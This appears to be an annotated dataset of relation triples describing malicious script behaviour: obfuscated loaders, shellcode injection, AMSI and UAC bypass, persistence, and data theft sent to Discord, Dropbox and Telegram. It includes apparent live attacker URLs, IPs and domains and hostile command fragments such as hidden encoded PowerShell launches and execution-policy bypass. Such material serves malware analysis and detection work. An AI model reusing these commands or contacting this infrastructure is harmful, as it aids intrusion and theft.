+alias '8n953bcf7u4otjrsqagxh2kzyi06ldmw'	ALIAS	ReferTo	function 'IGEUWHBKBY'	FUNCTION
+The script	SUB	Access	http://zeytinburnucastajanslari.bykmedya.com/WebiconsetMobile-Wireless.txt	FILE
+The script	SUB	Create	$AA	FILE
+$AA	FILE	Have Name	random string	RANDOM STRING
+VsEnhance.bat	EXE	Execute	VsLabsData.ps1	EXE
+The script	SUB	Create	PNG image file t.png	FILE
+start-sleep -Seconds 15	SLEEP	Have	-Seconds 15	TIME
+The script	SUB	Use	WScript.Shell	WAPI
+The script	SUB	Download	u.exe	EXE
+start-sleep	SLEEP	Have	7-second delay	TIME
+The script	SUB	Delete	C:\Windows\Temp\KL.ps1	EXE
+The script	SUB	Use	CreateThread	WAPI
+The script	SUB	Have	Base64 Encoding	OBF
+The script	SUB	Check	Pointer size is 8	POINTER SIZE
+oghygb4	FUNCTION	Have	Obfuscated Code	OBF
+The script	SUB	Connect	a URL	URL
+py.ps1	EXE	Hosted	C:\ProgramData\Document	ProgramData PATH
+WD.PS1	EXE	Have	obfuscated PowerShell code	OBF
+iex	COMMAND	Decode	$c	OBF
+batch file	EXE	Hosted	'C:\Users\Public\Run' folder	PATH
+system information	PVI	Have	username	PVI
+The script	SUB	SetPermission	read and write	PERMISSION TO MEMORY
+The script	SUB	Use	Telegram bot token	BOT TOKEN
+The script	SUB	Connect	Dropbox	EXTERNAL SERVICE
+PowerShell script	SUB	Have	empty Try-Catch blocks	EMPTY Try-Catch
+The script	SUB	Change	Registry	REGKEY
+The script	SUB	Use	iex	COMMAND
+Base64 encoded command	OBF	Decoded	PowerShell command	PS COMMAND
+The script	SUB	Execute	s.exe	EXE
+powershell.exe	PS COMMAND	Download	a powershell file	EXE
+The script	SUB	Set	Custom User-Agent String	USER AGENT
+kernel32.dll	DLL	Have	VirtualProtect	WAPI
+dynamic assemblies	DYNAMIC ASSEMBLY	Use	DefineType	FUNCTION
+The script	SUB	Execute	Win32VirtualAlloc function	WAPI
+infinite loop	LOOP	Have	while(1)	Infinite Loop
+new thread	THREAD	Execute	shellcode	EXE
+The script	SUB	Download	SystemLogin.vbs	EXE
+script	SUB	Use	ToUnicode API	WAPI
+function ESTRDYUGIOHJPIUGYUFTDRSRTDYUGIOHJPK	FUNCTION	ConvertedTo	byte array	DATA
+The script	SUB	Use	-exec bypass	BYPASS PARAMETER
+scheduled task	TASK	Execute	remote script	REMOTE CODE
+multiple files (.ps1, .bat, .vbs)	EXE	Saved	a directory named Document within C:\ProgramData	ProgramData PATH
+VirtualProtect	WAPI	Protect	memory region	MEMORY
+The script	SUB	Have	-w hidden	BYPASS PARAMETER
+The script	SUB	Use	rundll32.exe	EXE
+hexadecimal strings	DATA	ConvertedTo	byte array	DATA
+POST request	POST	Uploaded	Discord webhook URL	URL
+Marshal.GetDelegateForFunctionPointer	Marshal WAPI	Create	delegate	DELEGATE
+MEMEMAN directory	PATH	LocatedIn	C:\ProgramData	ProgramData PATH
+DLL	OBF	Use	CreateThread	WAPI
+hardcoded access token	Access Token	Access	Dropbox account	EXTERNAL SERVICE
+The script	SUB	Use	System.Reflection.Assembly::Load	System.Reflection.Assembly Assembly
+The script	SUB	Use	Reflection	REFLECTION
+The script	SUB	Change Directory	C:\Users\$env:username\AppData\Local\Microsoft\Windows\Update\	USER APPDATA PATH
+The script	SUB	Execute	ToUnicode	WAPI
+The script	SUB	ESCALATE	-ep bypass	PARAMETER
+The script	SUB	Run	PowerShell instance	EXE
+agreeBrood.jpg	FILE	Hosted	C:\users\public	PATH
+malicious DLL	DLL	InjectedInto	explorer.exe	PROCESS
+The script	SUB	Have	reflective DLL injection	ACTION
+The script	SUB	Execute	PowerShell script	EXE
+The script	SUB	Modify	wallpaper	ACTION
+GPA	FUNCTION	Create	dynamic method	DYNAMIC FUNCTION
+a temporary file	EXE	Hosted In	system's temp directory	PATH
+The script	SUB	Execute	loop	LOOP
+PowerShell script	SUB	Have	Base64 Encoded Data	OBF
+Base64 Encoded String	OBF	Decode	potentially malicious payload	OBF
+The script	SUB	Decode	obfuscated Base64 string	OBF
+new thread	THREAD	Exeucte	shellcode	CODE
+The script	SUB	Execute	code in memory	CODE
+command-line arguments	COMMAND	Have	powershell	PS COMMAND
+specific key presses	EVENT	Include	Ctrl + C	EVENT
+PowerShell	PS COMMAND	Inject	DLL	OBF
+encoded x86 assembly code	ASM	Execute	EICAR test string	EICAR STRING
+text file	FILE	Contains	full name	PVI
+The script	SUB	Create	new thread	THREAD
+The script	SUB	Create	Dynamic Assembly	ASM
+The script	SUB	Create	Add.bat	EXE
+Start-Sleep	COMMAND	Execute	the program execution for 6 seconds	SLEEP
+The script	SUB	Modify	System Web Proxy and Default Credentials	DATA
+The script	SUB	Have	-NoE	PARAMETER
+the script	SUB	Upload	Dropbox account	SERVICE
+The script	SUB	Download	NSudo.exe	EXE
+Set-ItemProperty	COMMAND	Change	registry key	REGKEY
+WaitForSingleObject	WAPI	Execute	wait until the thread to finish	WAIT
+The script	SUB	Encode	commands	COMMAND
+The script	SUB	Check	PowerShell version	PVI
+The script	SUB	Execute	iex	COMMAND
+The script	SUB	Executes	start-job	COMMAND
+The script	SUB	Delete	screenshots	PVI
+The script	SUB	OBF	base64 encoding and decompression	OBF
+The script	SUB	Execute	evil.exe	EXE
+The script	SUB	Add Exclusion	.dll	FILE
+The script	SUB	Have	VirtualAlloc	WAPI
+Hardware breakpoints	BREAKPOINT	Bypass	AMSI	DEFENDER
+INSTALL function	Function	Create	VBScript	EXE
+The script	SUB	Change	memory protection level	SETTING
+The script	SUB	Have	-WindowStyle Hidden	PARAMETER
+System information	PVI	Includes	Wi-Fi passwords	PVI
+The script	SUB	Create	Add.vbs	EXE
+Ctrl + X	Action	Trigger	clipboard monitoring	ACTION
+The script	SUB	Create	xx.bat	EXE
+script	SUB	Create	new thread	THREAD
+install.vbs	EXE	Decode	LONG_BYTE_SEQUENCE	OBF
+The script	SUB	Execute	iex $text	COMMAND
+entire screen	PVI	Saved	$env:USERPROFILE\AppData\Local\Temp\$env:computername-Capture.png	FILE
+curl	EXE	UPLOAD	POST request	DATA
+file.exe	EXE	Downloaded	https://example.com/file.exe	URL
+The script	SUB	Connect	Remote Server	EXTERNAL SERVICE
+The script	SUB	Create	WKDXIRNNHFHKNAFGOARGSL.vbs	EXE
+The script	SUB	Copy	base64 decoded data	OBF
+The script	SUB	Create	multiple files	FILE
+VirtualAlloc	WAPI	CalledWith	flProtect: 0x40	PARAMETER
+The script	SUB	Allocate	memory	MEMORY
+The script	SUB	Create	.NET assembly	EXE
+TBFLVIISWLYQJRIYEDPLGO.bat	EXE	Have	Obfuscated String	OBF
+PasswordVault class	CLASS	Collect	stored passwords	PVI
+The script	SUB	Execute	ROBOCOPY	COMMAND
+arx-Slkmrtswx.exe	EXE	Downloaded	http://80.66.75.25/	URL
+YWGCNHBTTYGDVSHYYNDAIO.vbs	EXE	Created By	The script	SUB
+The script	SUB	Use	-NoProfile and -WindowStyle Hidden	PARAMETER
+t.png	FILE	Convert	byte array	FILE
+The script	SUB	Have	string concatenation	OBF
+PDF.ps1	FILE	Use	reflection	ACTION
+The script	SUB	Use	Reflection.Assembly.Load	Function
+The script	SUB	Have	-nop	BYPASS PARAMETER
+complex byte array ($fHuDQdbdRNHLE)	OBF	Dencrypt	x86 assembly instructions	ASM
+The script	SUB	Collect	operating system details	PVI
+getit	FUNCTION	Perform	Execute	ACTION
+The script	SUB	Download	file.exe	EXE
+Get-WebCamImage	PS COMMAND	capture	images from the webcam	PVI
+VirtualAlloc	WAPI	Allocate	decoded byte sequence	OBF
+The script	SUB	Have	obfuscated or encrypted payload	OBF
+The script	SUB	Execute	code from a remote server	CODE
+The script	SUB	Load	an assembly	EXE
+a   file	FILE	Saved	user's temporary folder	TEMP PATH
+The script	SUB	Monitor	Left Ctrl + Right Ctrl	ACTION
+tmpD994.tmp	FILE	Hosted	C:\Users\Owner\AppData\Local\Temp	PATH
+The script	SUB	Delete	Itself	ACTION
+encoded strings	OBF	Have	http://192WSEDRFGTYHUJIK227WSEDRFGTYHUJIK225WSEDRFGTYHUJIK184/fdgfdsWSEDRFGTYHUJIKtxt	URL
+The script	SUB	Use	PowerShell Execution Policy Bypass	PowerShell Execution Policy Bypass ACTION
+The script	SUB	Execute	g.exe	EXE
+The script	SUB	Use	Obfuscation	OBF
+specific file types	DATA	Include	environment variables	DATA
+New.vbs	EXE	Save	C:\Users\Public\Run\New.vbs	PATH
+The script	SUB	Create	new event filter and consumer	ACTION
+Add.vbs	EXE	Execute	batch file	EXE
+The script	SUB	Execute	YWGCNHBTTYGDVSHYYNDAIO.bat	EXE
+The script	SUB	Have	$pgfPZfQqYmkrtxEjYM	PARAMETER
+The script	SUB	Download	max.exe	EXE
+$cake	VAR	Is	Base64 encoded string	OBF
+obfuscated byte array	DATA	CopiedInto	memory space	MEMORY
+Report.ps1	EXE	Hosted	C:\Users\Public\Music	PATH
+The script	SUB	Execute	bitsadmin	COMMAND
+The script	SUB	Search	user's Documents folder and its subdirectories	PATH
+The script	SUB	DOWNLOAD	https://1drv.ms/u/s!AiQ6jQ57z2DhgY?e=54952849	URL
+The script	SUB	Create	log.ps1	FILE
+The script	SUB	Execute	while ($true)	LOOP
+The script	SUB	Collect	city	PVI
+Received data	OBF	DecodedWith	ASCII encoding	PARAMETER
+The script	SUB	Check	c:\windows\system32\vmware.dll	FILE
+The script	SUB	Use	VirtualAlloc	WAPI
+The script	SUB	Have	while(1)	LOOP
+The script	SUB	Have	-ep bypass	BYPASS PARAMETER
+The script	SUB	Collect	user and system details	PVI
+aAB0AHQAcAA6AC8ALwAxADIALgA0ADgALgAxADgANgAuADkAOAA6ADQANAAzAA==	URL	Have Name	random string	RANDOM STRING
+IEX	IEX COMMAND	Execute	encoded Powershell code	OBF
+The script	SUB	Download	a file	EXE
+hidden directory	PATH	Hosted	1.bat	EXE
+The script	SUB	USE	reflection	FUNCTION
+encoded command	OBF	Have	http://ozoz.com/wp-content/sngl/310307041dobj2pkd	URL
+The script	SUB	Contact	remote server	EXTERNAL SERVICE
+The script	SUB	Execute	encoded command	COMMAND
+The script	SUB	Connect	91.92.136.20	IP ADDRESS
+The script	SUB	Delete	.lnk files	FILE
+go function	ACTION	Write	install.ps1	EXE
+The script	SUB	Use	PowerShell	PS COMMAND
+The script	SUB	Create	VBScript file	FILE
+Commands	COMMAND	CAN	disable security features	ACTION
+$screens.Bounds	COMMAND	Save	$env:USERPROFILE\AppData\Local\Temp\COMPUTERNAME-Capture.png	FILE
+The script	SUB	Download	https://updatea1.com/s3ok71/index/...	URL
+The script	SUB	Use	VirtualProtect	WAPI
+scheduled task named log	TASK	Execute	VBScript	SCRIPT
+batch file WD.bat	EXE	Execute	PowerShell script WD.PS1	EXE
+a scheduled task	TASK	Execute	sqmapi.vbs	EXE
+The script	SUB	Execute	schtasks	COMMAND
+The script	SUB	Use	rundll32	EXE
+The script	SUB	Execute	$screens.Bounds	ACTION
+The script	SUB	Write	process ID (PID) to a temporary file	FILE
+Base64 payload	OBF	Decrypted	shellcode	CODE
+The script	SUB	Collect	Sensitive Data	PVI
+.NET assembly	ASSEMBLY	Executed By	The script	EXECUTE
+The script	SUB	Connect	https://1drv.ms/u/s!AiQ8M5p3402FgQ	URL
+The script	SUB	Download	2.tar.gpg	FILE
+The script	SUB	Modify	REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} /f	REGKEY
+The script	SUB	Disable	PowerShell transcript logging	PS Transcript logging
+directory in C:\ProgramData\WD	FOLDER	Have	WD.bat	EXE
+The script	SUB	Execute	CreateThread	ACTION
+The script	SUB	Execute	Microsoft.VisualBasic.Interaction.CallByname	Interaction.CallByname WAPI
+The script	SUB	Terminate	RegSvcs	PROCESS
+The script	SUB	Execute	PresentationCore	CODE
+new-object net.webclient	COMMAND	Have	downloadstring	PARAMETER
+The script	SUB	Use	ADODB.Connection	WAPI
+$ODW	VAR	Host	RegSvcs.exe	EXE
+The script	SUB	Create	'R##egSvc#####s.exe'	EXE
+The script	SUB	Access	System's default proxy	PVI
+The script	SUB	Execute	CgKYDo.exe	EXE
+The script	SUB	Execute	without user interaction	ACTION
+The script	SUB	Download	powershell.exe	EXE
+The script	SUB	Write	Sexology.~!!!!!!!!!!!!!!!!~	FILE
+$ClqZsAS	COMMAND	Have	unknown source	SOURCE
+$hnzVudhxc	OBF	Copied	memory	MEMORY
+shellcode	EXE	Loaded	executable memory	MEMORY
+Error Suppression	ERROR HANDLER	Use	try-catch block	TRY-CATCH
+delegate	DELEGATE	ReferTo	execute code at memory address	CODE
+peltgon.zip	FILE	Hosted	https://tengkis.b-cdn.net/peltgon.zip	URL
+The script	SUB	Have	-NonI	PARAMETER
+HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run	REGKEY	Set Value	TrlUqMsx	VALUE
+Add-Type -TypeDefinition	COMMAND	Bypass	PowerShell script execution policy	PowerShell script execution policy ACTION
+The script	SUB	Use	Reflection.Assembly	WAPI
+script	SUB	Obfuscates	byte array	OBF
+$B456	PARAMETER	Concatenate	$C789	PARAMETER
+The script	SUB	Allocates	executable memory	MEMORY
+The script	SUB	Use	base64 encoded byte array	OBF
+Base64 strings	OBF	ConvertedTo	files	FILE
+The script	SUB	Download	tera15.zip	FILE
+The script	SUB	Copy	Byte Array	DATA
+The script	SUB	Create	new object using IO.Compression.DeflateStream	ACTION
+The script	SUB	Have	$dook	OBF
+VirtualAlloc Function	WAPI	Hosted	kernel32.dll	LIBRARY
+byte array	DATA	Have	x86 assembly code	CODE
+Invoke-WebRequest	COMMAND	Have	Download	ACTION
+The script	SUB	Execute	lsma12.exe	EXE
+VBScript (JJVXCDAUCHAIHBIEPXDBCS.vbs)	EXE	Download and Execute	file	FILE
+PowerShell script	SUB	Define	function Func1	FUNCTION
+Invoke-Expression	COMMAND	Have	-ExecutionPolicy Bypass	PARAMETER
+PDF.ps1	FILE	Decode	Base64 strings	OBF
+The script	SUB	Use	obfuscated Code	OBF
+PowerShell script (Smart.ps1)	EXE	Have	command-line switches (-NOP, -WIND, -HIDDEN, -eXEC, -BYPASS, -NONI)	BYPASS PARAMETER
+PowerShell command	PS COMMAND	Download	malicious content	DATA
+The script	SUB	Use	Base64 encoded command	OBF
+The script	SUB	Execute	p9d2s.exe	EXE
+The script	SUB	Create	PasswordVault class	CLASS
+The script	SUB	Add Exclusion	scheduled task for persistence	TASK
+Base64 Encoded Command	OBF	Have	powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have -NoP -sta -w 1	BYPASS PARAMETER
+powershell -NoP -sta -w 1 -enc <encoded_command>	PS COMMAND	Have	-enc <encoded_command>	ENCODED PARAMETER	
+The script	SUB	Execute	Set-ExecutionPolicy -Scope CurrentUser Bypass -Force	PS COMMAND
+Set-ExecutionPolicy -Scope CurrentUser Bypass -Force	PS COMMAND	Have	PowerShell script execution policy setting	PowerShell script execution policy ACTION	
+The script	SUB	Decodes	obfuscated Base64 string	DATA
+This script	SUB	Use	DefineDynamicAssembly	Dynamic_Assembly_Encryption
+The script	SUB	Delete	temporary files and folders	TEMP PATH
+New.vbs	EXE	SavedTo	C:\Users\Public\Run\	PATH
+The script	SUB	Hide	output	ACTION
+The script	SUB	Add Exclusion	log-analyzer.exe	EXE
+The script	SUB	Download	https://example.com/malicious.exe	EXE
+Ctrl + Ctrl key press	EVENT	Trigger	send specific message	ACTION
+The script	SUB	Execute	captures screenshots	ACTION
+The script	SUB	Have	Obfuscated Base64 String	OBF
+Invoke-Expression	COMMAND	Have	$env:temp\Get-Content.PS1	EXE
+The script	SUB	Download	upd.exe	EXE
+VBScript file	FILE	Use	Windows Scripting Host	WAPI
+byte array	DATA	Copied	allocated memory	MEMORY
+The script	SUB	Use	IO.Compression.DeflateStream	WAPI
+The script	SUB	Execute	.NET assembly	WAPI
+The script	SUB	Collect	entire screen	PVI
+a Discord API	FUNCTION	Have	a Webhook URL	URL
+The script	SUB	Execute	XOR Encryption	OBF
+Start-Sleep	Start-Sleep COMMAND	Execute	3 seconds of pause	SLEEP
+The script	SUB	Have	infinite loop	LOOP
+The script	SUB	Access	CommonDocuments folder	FOLDER
+script	SUB	Write	$env:APPDATA\Kematian\out*.jpg	FILE
+The script	SUB	Create	temporary file	PATH
+The script	SUB	Receive	ASCII-encoded strings	DATA
+Invoke-Expression	COMMAND	Have	-Bind	PARAMETER
+tmp44CC.tmp	FILE	Hosted	AppData\Local\Temp	PATH
+scheduled task	TASK	Execute	VBScript	EXE
+The script	SUB	Create	thread	PROCESS
+The script	SUB	Use	Obfuscated variable names	OBF
+The script	SUB	Performs	XOR operation	ACTION
+The script	SUB	Create	'C:\ProgramData\YWGCNHBTTYGDVSHYYNDAIO'	PATH
+The script	SUB	Use	system's web proxy	PROXY
+The script	SUB	Collect	Username	PVI
+script	SUB	Access	webcam	DEVICE
+Invoke-Expression	COMMAND	Have	iex	PARAMETER
+hardcoded credentials	PARAMETER	Connect	srsmsb01@gmail.com	URL
+Report.ps1	EXE	Decode	hex string	DATA
+The script	SUB	Allocate	memory	MEMORY
+The script	SUB	EXECUTE	Here	FUNCTION
+files with random names	FILE	Have Name	random names	RANDOM STRING
+The script	SUB	Execute	decoded string $cc	DATA
+The script	SUB	Execute	-eC	PARAMETER
+The script	SUB	Create	Loader.vbs	EXE
+Run.BAT	FILE	Hosted	C:\Users\Public\Run\	PATH
+getit function	FUNCTION	Download	Facexbbook.exbxexb	FILE
+The script	SUB	Dencrypt	ASCII encoding	OBF
+The script	SUB	Download	lsma12.exe	EXE
+The script	SUB	Set	Spoofed user-agent string	PARAMETER
+the script	SUB	Have	dischat function	FUNCTION
+The script	SUB	Execute	WD.bat	EXE
+The script	SUB	Use	Obfuscation	OBF
+The script	SUB	Decrypt	obfuscated byte sequence	OBF
+The script	SUB	Create	PDF.ps1	EXE
+The script	SUB	Have	base64-encoded string `$XyybdfuQWuefStm`	OBF
+$pe	PARAMETER	Load	dynamic assembly	CODE
+The script	SUB	Download	https://radiocatolicalavozdedios.com/wp-includes/IXR/.en/C398574834rM.txt	URL
+The script	SUB	Access	C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_compiler.exe	EXE
+The script	SUB	Downloads and Executes	client32.exe	EXE
+kernel32.dll	DLL	Have	VirtualAlloc	WAPI
+The script	SUB	Execute	XSJYEGLBUOZEHBTNLNLSOU.ps1	EXE
+PowerShell script (JJVXCDAUCHAIHBIEPXDBCS.ps1)	EXE	Create	scheduled task	TASK
+VirtualAlloc	WAPI	Allocate	executable memory	MEMORY
+Base64-encoded string	OBF	Dencrypt	decoded data	DATA
+The script	SUB	Use	WindowsRuntime content type	OBF
+The script	SUB	Extract	$2tP2ESoz	$uzLJuErm	PATH
+The script	SUB	Collect	IP address	IP
+The script	SUB	Have	Base64 Encoded Payload	OBF
+The script	SUB	Load	WindowsBase	ASSEMBLY
+The script	SUB	Define	GetDelegateForFunctionPointer	FUNCTION
+The script	SUB	Encrypt	Base64 Encoded Command	OBF
+QYZZDAOKPZUJIKAFEZWZDV.vbs	VBS	Execute	malicious PowerShell script	EXE
+The script	SUB	Have	long byte sequences	OBF
+The script	SUB	Send	collected privacy data	PVI	hardcoded server IP address	IP ADDRESS
+The script	SUB	Create	files with random names	FILE
+The script	SUB	Delete	scheduled task 'det'	TASK
+The script	SUB	Create	batch file 1.bat	EXE
+Data	DATA	CopiedTo	executable memory	MEMORY
+C:/nkll/	PATH	Have	Hidden	HIDDEN PROPERTY
+files	FILE	Hosted	C:\\ProgramData	ProgramData PATH
+Screenshot.vbs	EXE	Hosted	C:\ProgramData\Document	ProgramData PATH
+1.bat	FILE	Save	C:\ProgramData\log	LOG
+The script	SUB	Use	hardcoded credentials	ENCRYPTED PARAMETER
+scheduled task	TASK	Named	UpdateTask	TASK_NAME
+The script	SUB	Have	-nop	BYPASS PARAMETER
+system information	PVI	Include	current date	PVI
+The script	SUB	Bypass	User Account Control	AUTHENTIFICATION
+The script	SUB	Have	-EncodedCommand	EncodedCommand PARAMETER
+The script	SUB	Have	on error resume next	LOOP
+The script	SUB	Execute	retrieved string as PowerShell command	PS COMMAND
+The script	SUB	Collect	ACL data	PVI
+The script	SUB	EXECUTE	update.exe	EXE
+The script	SUB	Create	alias '8n953bcf7u4otjrsqagxh2kzyi06ldmw'	ALIAS
+The script	SUB	Create	WD.vbs	EXE
+max.exe	EXE	Hosted	c:\windows\debug	SYSTEM PATH
+The script	SUB	Have	$GB	OBF
+The script	SUB	Send	output with PS prefix	DATA
+System.IO.Compression.DeflateStream	COMMAND	DECOMPRESS	encoded data	OBF
+The script	SUB	Have	VirtualAlloc	WAPI
+The script	SUB	Create	scheduled task 'coinmarketcap'	TASK
+infinite loop	LOOP	Wait	Ctrl + C or Ctrl + X key press	EVENT
+The script	SUB	Load	DLL ($ajsidjasidviajasidjaisjdjaisjd)	EXE
+zip file	COMPRESSED FILE	SentTo	Discord webhook	EXTERNAL SERVICE
+The script	SUB	Decrypt	base64 encoded strings	OBF
+The script	SUB	Create	random directory	PATH
+The script	SUB	Use	Base64 encoded data	OBF
+The script	SUB	Execute	WmiMgmt.msc	EXE
+The script	CLASS	Use	VirtualAlloc	WAPI
+Discord API	FUNCTION	Connect	Webhook URL	URL
+C:\Users\Owner\AppData\Local\Temp\tmpECC8.tmp	TEMP FILE	Have	stored passwords	PVI
+$JLHptGzhl	DATA	Contain	shellcode	EXE
+The script	SUB	Execute	Get-NetAdapter	COMMAND
+The script	SUB	Escalate	User Account Control (UAC)	ACCESS LEVEL
+scheduled task	TASK	Execute	every 3 minutes	FREQUENCY
+The script	SUB	Execute	Sleep 1	SLEEP
+The script	SUB	Execute	start-sleep commands	SLEEP
+The script	SUB	Execute	Invoke-WebRequest	WebRequest COMMAND
+The script	SUB	Use	RC4 encryption algorithm	OBF
+The script	SUB	Check	pointer size is 8	POINTER SIZE
+The script	SUB	Collect	Computer name	PVI
+The script	SUB	Collect	user's clipboard	PVI
+The script	SUB	Monitor	Ctrl + C	KEYBOARD ACTION
+The script	SUB	OBF	Base64 or hexadecimal encoded data	OBF
+The script	SUB	Save	C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\RJD5UYNO.exe	EXE
+rentolimanakasipondoromontipuno	FUNCTION	Have Name	random strings	RANDOM STRING
+The script	SUB	Create	result.zip	COMPRESSED FILE
+a file	EXE	Hosted	https://cdn-us-tech.wtf-system-4759011.workers.dev	URL
+The script	SUB	Create	$env:temp\keylogger.txt	FILE
+The script	SUB	ADD REFERENCE TO	System.Windows.Forms.dll	NET assembly
+The script	SUB	Decrypt	response	RESPONSE OF WEB QUEST
+The script	SUB	Execute	Seg.txt	FILE
+PowerShell script imcq.ps1	EXE	Execute	Run in hidden mode	HIDDEN MODE
+The script	SUB	Wait	15 seconds	Time
+VirtualAlloc	WAPI	Allocate	memory	MEMORY
+The script	SUB	Create	YWGCNHBTTYGDVSHYYNDAIO.ps1	EXE	
+http://ozzoeyi/index.php?5964824458645864581	FILE	Hosted	http://ozzoeyi	URL
+The script	SUB	Use	$sc	OBF
+access token	ACCESS TOKEN	SentTo	Dropbox account	EXTERNAL SERVICE
+The script	SUB	Write	install.ps1	EXE
+GoogleUpdate.ps1	EXE	Hosted	https://invitadoscarlsjr.mx/.POP/.A.jpg	REMOTE FILE
+https://invitadoscarlsjr.mx/.POP/.A.jpg	REMOTE FILE	Hosted	https://invitadoscarlsjr.mx/.POP	URL
+The script	SUB	Execute	downloaded file	EXE
+arguments	PARAMETER	ReferTo	caspol.exe	COMMAND
+The script	SUB	Terminate	browser processes	PROCESS
+$rNAjWamiWZfJuX	OBF	Have	complex method	FUNCTION
+XX.PS1	EXE	Have	obfuscated PowerShell code	OBF
+The script	SUB	Use	Reflective DLL Injection	Reflective DLL Injection ACTION
+P/Invoke	WAPI	Import	VirtualAlloc	WAPI
+Script	SUB	Include	Sleep command	SLEEP
+The script	SUB	Write	.PS1 files	EXE
+The script	SUB	Call	func_get_proc_address	FUNCTION
+The script	SUB	Have	heavily obfuscated code	OBF
+Zip file	COMPRESSED FILE	Have	Random password	PASSWORD
+The script	SUB	Connect	htn8v6pprexbssplayy.com	URL
+The script	SUB	Use	complex encoding scheme	OBF
+The script	SUB	Have	-w hidden	BYPASS PARAMETER
+The script	SUB	Have	base64 encoding	OBF
+Base64 Encoded Binary Data	OBF	Decoded	malicious code	EXE
+1.exe	EXE	Hosted	http://185.244.11.103/1.exe	URL
+The script	SUB	Create	$GvyxHVFaoQz	OBF
+The script	SUB	Terminate	mshta	PROCESS
+The script	SUB	Define	asceeeeeeeeeeeeeeee	FUNCTION
+files	FILE	Saved	C:\ProgramData	PATH
+Pictures.vbs	EXE	Execute	PowerShell script	PS COMMAND
+IEX	COMMAND	Execute	the downloaded file	FILE
+The script	SUB	Have	-NoP	BYPASS PARAMETER
+The namespace toooyou	NAMESPACE	Have	the Black method	FUNCTION
+The script	SUB	Use	ALOSHDOX32FESGSEGYBTVSRASWARBVAAARVWWV function	FUNCTION
+The script	SUB	Import	.NET assembly from $BOOKS	ASSEMBLY
+PowerShell	PS COMMAND	Use	/w 1	PARAMETER
+install.vbs	EXE	Hosted	user's AppData folder	USER APPDATA PATH
+Foreach-Object	LOOP	Read	payload	DATA
+The script	SUB	Connect	https://www.minpic.de/k/bjim/sx9x9/	URL
+Invoke-Expression	IEX COMMAND	Execute	decoded byte array	DATA
+The script	SUB	Execute	commands	COMMAND
+Start-Process	COMMAND	Have	-WindowStyle Hidden	BYPASS PARAMETER
+The script	SUB	Create	cgihvzm.ps1	EXE
+iex	IEX COMMAND	Download	1.exe	EXE
+The script	SUB	Have	obfuscated byte sequence	OBF
+The script	SUB	Delete	'adobe' directory	PATH
+The script	SUB	Connect	$serv	EXTERNAL SERVICE
+The script	SUB	Use	base64 and hexadecimal encoding	ENCRYPTION ACTION
+The script	SUB	Have	sleep timer	SLEEP
+The script	SUB	Use	Reflective DLL Injection	Reflective DLL Injection ACTION
+The script	SUB	Execute	data from connection	DATA
+The script	SUB	Execute	decapodvsWW.exe	EXE
+specific file types	FILE	UploadedTo	Dropbox account	EXTERNAL SERVICE
+$kgjFavhe	OBF	Is	shellcode	EXE
+The script	SUB	Check	pointer size	POINTER SIZE
+The script	SUB	Execute	Start-Sleep	SLEEP
+The script	SUB	Save	Loader.vbs	EXE
+Start-Sleep	COMMAND	Have	-Seconds 270	TIME
+The script	SUB	Have	byte array `$JTlRGFdlQ`	OBF
+Web Requests	WEB REQUEST	Connect	rockslootni.com	URL
+The script	SUB	Use	Start-Job	COMMAND
+The script	SUB	Check	PowerShell version >= 3	VERSION
+downloaded executables	EXE	Loaded	memory	MEMORY
+The script	SUB	Execute	add an integer number to ASCII values of characters	OBF
+The script	SUB	Copy	$juzfytNGBOpHp	MEMORY
+The script	SUB	Create	C:\s.exe	EXE
+assembly from base64 string	ASSEMBLY	Contain	main function	FUNCTION
+The script	SUB	Execute	Payload in memory	DATA
+delegate	DELEGATE	Execute	code in memory	CODE
+The script	SUB	Create	alias 'cu' for 'j'	ALIAS
+The script	SUB	Write	PowerShell script (BT.ps1)	EXE
+The script	SUB	Execute	C:\Windows\Microsft.NET\Framework\v4.0.30319\RegSvcs.exe	Register NET service ACTION
+WD.vbs	EXE	Hosted	directory in C:\ProgramData\WD	ProgramData PATH
+The script	SUB	Connect	update-ledger.net	EXTERNAL URL
+The script	SUB	Have	-ExecutionPolicy Bypass	PARAMETER
+PowerShell process	PS COMMAND	Have	hidden window	BYPASS PARAMETER
+sensitive information	PVI	SentTo	rick63.publicvm.com	URL
+The script	SUB	Use	P/Invoke	WAPI
+The script	SUB	Execute	function `dischat`	FUNCTION
+The script	SUB	Terminate	'javaw'	PROCESS
+The script	SUB	Download	https://example.com/file.exe	EXE
+file.exe	EXE	Hosted	https://example.com	URL	
+The script	SUB	Connect	Discord webhook URL	URL
+The script	SUB	Filter	types containing "iUtils"	TYPES
+The script	SUB	Load	.NET assembly	ASSEMBLY
+scheduled task 'PDF'	TASK	Execute	every 2 minutes	FREQNEUCY
+$ErrorActionPreference	PARAMETER	SetTo	SilentlyContinue	PARAMETER VALUE
+The script	SUB	Execute	RetrievePassword()	FUNCTION TO COLLECT PVI
+The script	SUB	Execute	powershell	PS COMMAND
+The script	SUB	Have	-NoExit	BYPASS PARAMETER
+asceeeeeeeeeeeeeeee	FUNCTION	Use	Base64 Encoding	OBF
+r.exe	EXE	Hosted	http://89.23.98.75:7777/	URL
+The script	SUB	Save	shortcut	$uZjpAzXjSE	SHORTCUT
+The script	SUB	Execute	remote PowerShell script from 'http://example.com/script.ps1'	REMOTE CODE
+C:\Windows\SERVIC~1\MSSQL$~1\AppData\Local\Temp\RJD5UYNO.exe	EXE	Saved	Temporary Folder of MSSQL service	TEMP PATH
+The script	SUB	Use	.NET Reflection library	NET REFLECTION LIB	
+The script	SUB	Use	WindowsBase .NET assembly	ASSEMBLY
+rundll32.exe	EXE	Have	DllRegisterServer	WAPI
+GoogleUpdate.ps1	EXE	Hosted	https://invitadoscarlsjr.mx/.POP/.C.jpg	REMOTE FILE
+https://invitadoscarlsjr.mx/.POP/.C.jpg	REMOTE FILE	Hosted	https://invitadoscarlsjr.mx	URL
+The script	SUB	Wait	start-sleep -s 7	TIME	
+The script	SUB	Wait	random delay	TIME
+the script	SUB	Use	$sc=SilentlyContinue	SilentlyContinue PARAMETER
+The script	SUB	Create	alias "zwert"	ALIAS
+The script	SUB	Download	g.exe	EXE
+The script	SUB	Execute	Start-Process	COMMAND
+VBScript	EXE	Execute	initial PowerShell script	EXE
